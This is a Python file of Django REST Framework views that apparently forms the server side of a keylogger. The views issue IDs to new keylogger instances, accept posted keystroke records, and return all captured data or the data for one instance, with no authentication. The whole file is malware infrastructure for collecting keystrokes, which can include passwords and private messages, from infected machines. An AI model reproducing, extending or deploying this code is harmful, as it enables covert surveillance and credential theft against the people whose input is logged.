from django.shortcuts import render, redirect
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework import status
from django.views import View
from django.http import HttpResponse
from django.db import transaction

from .models import *
from .serializers import *


class GetAllData(APIView):
    def get(self, request, format=None):
        serializer = GetDataSerializer(KeyloggerData.objects.all(), many=True)
        return Response(serializer.data)

    @transaction.atomic
    def post(self, request):
        serializer = GetDataSerializer(data = request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(status=status.HTTP_201_CREATED)
        else:
            return Response(status=status.HTTP_400_BAD_REQUEST)
        

class CreateId(APIView):
    @transaction.atomic
    def get(self, request):
        new = KeyloggerID()
        new.save()
        serializer = GetIDSerializer(new)
        return Response(serializer.data)

class GetDataById(APIView):
    def get(self, request):
        serializer = GetDataSerializer(KeyloggerData.objects.filter(keylogger_ref = request.GET['pk']), many=True)
        return Response(serializer.data)